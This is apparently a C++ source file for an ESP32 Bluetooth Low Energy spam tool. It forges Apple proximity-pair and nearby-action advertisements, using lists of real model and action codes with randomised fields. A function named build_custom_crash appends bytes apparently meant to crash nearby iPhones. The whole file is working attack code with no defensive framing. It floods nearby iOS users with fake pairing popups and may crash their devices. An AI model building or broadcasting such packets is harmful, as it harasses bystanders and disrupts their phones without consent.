#include "ios.h"
#include "esp_random.h"
#include <cstdint>
#include <iterator>

namespace {

enum : uint8_t {
    proximity_pair = 0x07,
    nearby_action  = 0x0F,
};

constexpr uint16_t pp_models[] = {
    0x0E20, 0x0A20, 0x0055, 0x0030, 0x0220,
    0x0F20, 0x1320, 0x1420, 0x1020, 0x0620,
    0x0320, 0x0B20, 0x0C20, 0x1120, 0x0520,
    0x0920, 0x1720, 0x1220, 0x1620,
};

constexpr uint8_t na_actions[] = {
    0x13, 0x24, 0x05, 0x27, 0x20,
    0x19, 0x1E, 0x09, 0x2F, 0x02,
    0x0B, 0x01, 0x06, 0x0D, 0x2B,
};

size_t build_proximity_pair(uint8_t* buf) {
    uint16_t model = pp_models[esp_random() % std::size(pp_models)];

    uint8_t prefix = (model == 0x0055 || model == 0x0030)
                         ? 0x05
                         : (esp_random() % 2) ? 0x07 : 0x01;

    uint8_t i = 0;
    buf[i++] = 30;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = proximity_pair;
    buf[i++] = 25;

    buf[i++] = prefix;
    buf[i++] = (model >> 8) & 0xFF;
    buf[i++] = model & 0xFF;
    buf[i++] = 0x55;
    buf[i++] = ((esp_random() % 10) << 4) | (esp_random() % 10);
    buf[i++] = ((esp_random() % 8)  << 4) | (esp_random() % 10);
    buf[i++] = esp_random() & 0xFF;
    buf[i++] = esp_random() % 16;
    buf[i++] = 0x00;
    esp_fill_random(&buf[i], 16);
    i += 16;
    return i;
}

size_t build_nearby_action(uint8_t* buf) {
    uint8_t action = na_actions[esp_random() % std::size(na_actions)];

    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;

    uint8_t i = 0;
    buf[i++] = 10;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = nearby_action;
    buf[i++] = 5;
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;
    return i;
}

size_t build_custom_crash(uint8_t* buf) {
    uint8_t action = na_actions[esp_random() % std::size(na_actions)];

    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;

    uint8_t i = 0;
    buf[i++] = 16;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = nearby_action;
    buf[i++] = 5;
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;

    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x10;
    esp_fill_random(&buf[i], 3);
    i += 3;
    return i;
}

}

size_t module::ios::build_adv(uint8_t* buf) {
    switch (esp_random() % 3) {
        case 0:  return build_proximity_pair(buf);
        case 1:  return build_nearby_action(buf);
        default: return build_custom_crash(buf);
    }
}